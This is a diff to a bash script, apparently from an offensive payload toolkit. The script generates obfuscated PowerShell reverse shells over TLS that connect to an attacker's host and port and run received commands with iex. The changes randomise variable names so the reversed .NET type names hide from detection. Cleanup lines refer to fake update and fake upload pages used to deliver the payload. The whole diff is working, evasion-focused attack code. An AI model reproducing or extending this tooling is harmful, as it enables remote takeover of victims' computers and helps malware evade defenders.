@@ -12862,6 +12862,14 @@ fi
 
 
 ## Build Reverse TCP Powershell Shell (OpenSSL).
+# Obfuscating rev tcp PS shell syscalls
+Length=$(cat /dev/urandom | tr -dc '3-9' | fold -w 1 | head -n 1)
+SysCall=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length)
+syscallvar="\$$SysCall"
+Length2=$(cat /dev/urandom | tr -dc '3-9' | fold -w 1 | head -n 1)
+SysCall2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length2)
+syscallvar2="\$$SysCall2"
+
 echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated Reverse TCP OpenSSL Shell" >> $IPATH/output/$NaM.ps1
@@ -12870,11 +12878,11 @@ echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "Start-Sleep -Milliseconds 300" >> $IPATH/output/$NaM.ps1
 echo "\$Vault = \"tneilCpcT.stekcoS.teN\";\$Certificate = \$Vault.ToCharArray();[Array]::Reverse(\$Certificate);" >> $IPATH/output/$NaM.ps1
-echo "\$NewComObject = (\$Certificate -Join '');\$tls64 = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$tls64.ToCharArray();" >> $IPATH/output/$NaM.ps1
-echo "[Array]::Reverse(\$CharArray);\$PSArgsBuffer = (\$CharArray -Join '');" >> $IPATH/output/$NaM.ps1
+echo "$syscallvar = (\$Certificate -Join '');\$tls64 = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$tls64.ToCharArray();" >> $IPATH/output/$NaM.ps1
+echo "[Array]::Reverse(\$CharArray);$syscallvar2 = (\$CharArray -Join '');" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "Start-Sleep -Milliseconds 200" >> $IPATH/output/$NaM.ps1
-echo "\$socket = New-Object \$NewComObject('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
+echo "\$socket = New-Object $syscallvar('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/$NaM.ps1
@@ -12884,7 +12892,7 @@ echo "        \$writer.flush()" >> $IPATH/output/$NaM.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
-echo "   \$data = (New-Object -TypeName \$PSArgsBuffer).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
+echo "   \$data = (New-Object -TypeName $syscallvar2).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/$NaM.ps1
 echo "   \$sendback2 = \$sendback + '[' + (hostname) + '] ' + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
 echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/$NaM.ps1
@@ -13874,6 +13882,14 @@ fi
 
 cd $IPATH/output
 ## Build Reverse TCP Powershell Shell (OpenSSL).
+# Obfuscating rev tcp PS shell syscalls
+Length=$(cat /dev/urandom | tr -dc '3-9' | fold -w 1 | head -n 1)
+SysCall=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length)
+syscallvar="\$$SysCall"
+Length2=$(cat /dev/urandom | tr -dc '3-9' | fold -w 1 | head -n 1)
+SysCall2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length2)
+syscallvar2="\$$SysCall2"
+
 echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
 echo "<#" > $IPATH/output/Client.ps1
 echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/Client.ps1
@@ -13882,10 +13898,10 @@ echo "#>" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
 echo "Start-Sleep -Milliseconds 300" >> $IPATH/output/Client.ps1
 echo "\$Waudt = \"tneilCpcT.stekcoS.teN\";\$Bin = \$Waudt.ToCharArray();[Array]::Reverse(\$Bin);" >> $IPATH/output/Client.ps1
-echo "\$NewObjectCommand = (\$Bin -Join '');\$Microphone = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Microphone.ToCharArray();" >> $IPATH/output/Client.ps1
-echo "[Array]::Reverse(\$CharArray);\$PSArgsBuffer = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
+echo "$syscallvar = (\$Bin -Join '');\$Microphone = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Microphone.ToCharArray();" >> $IPATH/output/Client.ps1
+echo "[Array]::Reverse(\$CharArray);$syscallvar2 = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/Client.ps1
+echo "\$socket = New-Object $syscallvar('$lhost', $lport)" >> $IPATH/output/Client.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/Client.ps1
 echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/Client.ps1
@@ -13896,7 +13912,7 @@ echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
 echo "Start-Sleep -Milliseconds 250" >> $IPATH/output/Client.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
-echo "   \$data = (New-Object -TypeName \$PSArgsBuffer).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
+echo "   \$data = (New-Object -TypeName $syscallvar2).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/Client.ps1
 echo "   \$sendback2 = \$sendback + '[' + (hostname) + '] ' + (pwd).Path + '> ';" >> $IPATH/output/Client.ps1
 echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/Client.ps1
@@ -13983,6 +13999,8 @@ rm $ApAcHe/Client.ps1 > /dev/nul 2>&1
 rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
 rm $IPATH/output/Client.ps1 > /dev/nul 2>&1
+rm $IPATH/output/cert.pem > /dev/nul 2>&1
+rm $IPATH/output/key.pem > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
